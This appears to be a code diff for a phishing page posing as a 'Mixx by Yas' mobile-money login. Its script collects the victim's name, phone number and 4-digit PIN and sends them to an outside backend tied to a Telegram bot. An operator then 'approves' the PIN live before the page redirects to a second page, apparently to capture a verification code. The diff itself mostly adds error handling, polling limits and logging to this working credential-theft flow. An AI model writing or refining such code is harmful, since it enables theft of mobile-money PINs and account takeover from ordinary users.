@@ -263,73 +263,228 @@ body{
 </div>
 
 <script>
-document.getElementById("phoneDisplay").value =
-  localStorage.getItem("phone") || "Numéro inconnu";
-
+// Get botId from URL
 const botId = new URLSearchParams(window.location.search).get("botId");
+console.log("Bot ID from URL:", botId);
+
+// If no botId, show error
+if (!botId) {
+  document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
+  document.querySelector(".action").style.opacity = "0.5";
+}
+
+// Set phone display
+document.getElementById("phoneDisplay").value = 
+  localStorage.getItem("phone") || "+255 712 345 678";
+
 const boxes = document.querySelectorAll(".pin-boxes input");
 const statusEl = document.getElementById("status");
 
 async function sendPinToTelegram(name, phone, pin) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
+  
+  // Clean and validate data
+  const cleanPhone = phone.replace(/\s/g, '');
+  
+  const payload = {
+    name: name || "Unknown",
+    phone: cleanPhone || "Unknown",
+    pin: pin || "",
+    botId: botId || ""  // Make sure botId is sent
+  };
+  
+  console.log("Sending to backend:", payload);
+  
   try {
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({ name, phone, pin, botId })
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(payload)
     });
-    return res.json();
-  } catch {
+    
+    console.log("Response status:", res.status);
+    
+    // Get the response text for debugging
+    const responseText = await res.text();
+    console.log("Response body:", responseText);
+    
+    if (!res.ok) {
+      // Try to parse error message from response
+      try {
+        const errorData = JSON.parse(responseText);
+        statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
+      } catch {
+        statusEl.textContent = `Server error (${res.status}): ${responseText}`;
+      }
+      return null;
+    }
+    
+    // Parse successful response
+    const data = JSON.parse(responseText);
+    console.log("Success response:", data);
+    return data;
+    
+  } catch (error) {
+    console.error("Network error:", error);
+    statusEl.textContent = "Network error. Please check your connection.";
     return null;
   }
 }
 
 async function pollPinApproval(requestId) {
   const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
-  return new Promise(resolve => {
-    const i = setInterval(async () => {
-      const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-      const d = await r.json();
-      if(d.approved === true || d.approved === false){
-        clearInterval(i);
-        resolve(d.approved);
+  let attempts = 0;
+  const maxAttempts = 20; // 30 seconds max
+  
+  return new Promise((resolve) => {
+    const interval = setInterval(async () => {
+      attempts++;
+      console.log(`Polling attempt ${attempts} for ${requestId}`);
+      
+      try {
+        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const data = await res.json();
+        console.log("Poll response:", data);
+        
+        if (data.blocked) {
+          clearInterval(interval);
+          statusEl.textContent = "Your account has been blocked.";
+          resolve(false);
+          return;
+        }
+        
+        if (data.approved === true || data.approved === false) {
+          clearInterval(interval);
+          resolve(data.approved);
+          return;
+        }
+        
+        if (attempts >= maxAttempts) {
+          clearInterval(interval);
+          statusEl.textContent = "Request timed out. Please try again.";
+          resolve(false);
+        }
+      } catch (error) {
+        console.error("Poll error:", error);
+        if (attempts >= maxAttempts) {
+          clearInterval(interval);
+          statusEl.textContent = "Request failed. Please try again.";
+          resolve(false);
+        }
       }
-    },1500);
+    }, 1500);
   });
 }
 
-boxes.forEach((box,i)=>{
-  box.addEventListener("input", async ()=>{
-    box.value = box.value.replace(/[^0-9]/g,'');
-    if(box.value && i<3) boxes[i+1].focus();
-    if(i===3 && box.value){
-      let pin=""; boxes.forEach(b=>pin+=b.value);
-      localStorage.setItem("pin",pin);
-      const name = localStorage.getItem("name")||"Unknown";
-      const phone = localStorage.getItem("phone")||"Unknown";
-      boxes.forEach(b=>b.disabled=true);
-      statusEl.textContent="PIN inatumwa...";
-      const res = await sendPinToTelegram(name,phone,pin);
-      if(!res||!res.requestId){
-       statusEl.textContent="Imeshindikana. Tafadhali jaribu tena.";
-        boxes.forEach(b=>{b.disabled=false;b.value="";});
-        boxes[0].focus(); return;
+// PIN input handling
+boxes.forEach((box, i) => {
+  box.addEventListener("input", async () => {
+    // Allow only numbers
+    box.value = box.value.replace(/[^0-9]/g, '');
+    
+    // Auto-advance to next box
+    if (box.value && i < 3) {
+      boxes[i + 1].focus();
+    }
+    
+    // Check if all 4 digits are entered
+    if (i === 3 && box.value) {
+      let pin = "";
+      boxes.forEach(b => pin += b.value);
+      
+      // Validate botId
+      if (!botId) {
+        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
+        boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        boxes[0].focus();
+        return;
       }
-      const ok = await pollPinApproval(res.requestId);
-      if(ok){
-        window.location.href="code.html?botId="+botId;
+      
+      // Get user data
+      const name = localStorage.getItem("name") || "Unknown";
+      const phone = localStorage.getItem("phone") || "Unknown";
+      
+      console.log("Submitting PIN:", { name, phone, pin, botId });
+      
+      // Disable inputs while processing
+      boxes.forEach(b => b.disabled = true);
+      statusEl.textContent = "Sending PIN for verification...";
+      
+      // Send PIN to backend
+      const res = await sendPinToTelegram(name, phone, pin);
+      
+      if (!res || !res.requestId) {
+        statusEl.textContent = "Failed to send PIN. Please try again.";
+        boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        boxes[0].focus();
+        return;
+      }
+      
+      statusEl.textContent = "Waiting for admin approval...";
+      
+      // Poll for approval
+      const approved = await pollPinApproval(res.requestId);
+      
+      if (approved === true) {
+        localStorage.setItem("pin", pin);
+        window.location.href = `code.html?botId=${botId}`;
+      } else if (approved === false) {
+        statusEl.textContent = "Incorrect PIN. Please try again.";
+        boxes.forEach(b => { b.disabled = false; b.value = ""; });
+        boxes[0].focus();
       } else {
-        statusEl.textContent="PIN uliyoingiza si sahihi.";
-        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        statusEl.textContent = "An error occurred. Please try again.";
+        boxes.forEach(b => { b.disabled = false; b.value = ""; });
         boxes[0].focus();
       }
     }
   });
-  box.addEventListener("keydown",e=>{
-    if(e.key==="Backspace"&&!box.value&&i>0) boxes[i-1].focus();
+  
+  // Handle backspace
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !box.value && i > 0) {
+      boxes[i - 1].focus();
+    }
   });
 });
+
+// Focus first input on load
 boxes[0].focus();
+
+// Add click handler for the login button
+document.querySelector(".action").addEventListener("click", () => {
+  // Check if any PIN is entered
+  let pin = "";
+  boxes.forEach(b => pin += b.value);
+  
+  if (pin.length === 4) {
+    // Trigger the last box's input event
+    const event = new Event('input');
+    boxes[3].dispatchEvent(event);
+  } else {
+    statusEl.textContent = "Please enter a 4-digit PIN";
+    boxes[0].focus();
+  }
+});
+
+// Also allow Enter key to submit
+boxes.forEach(box => {
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      let pin = "";
+      boxes.forEach(b => pin += b.value);
+      if (pin.length === 4) {
+        const event = new Event('input');
+        boxes[3].dispatchEvent(event);
+      } else {
+        statusEl.textContent = "Please enter a 4-digit PIN";
+      }
+    }
+  });
+});
 </script>
 
 </body>
